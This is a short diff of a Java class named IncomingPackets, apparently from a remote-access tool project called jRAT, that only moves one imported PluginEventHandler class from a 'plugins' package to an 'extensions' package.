@@ -4,7 +4,7 @@ import java.util.HashMap;
 import java.util.Set;
 
 import pro.jrat.Slave;
-import pro.jrat.plugins.PluginEventHandler;
+import pro.jrat.extensions.PluginEventHandler;
 
 
 public class IncomingPackets {
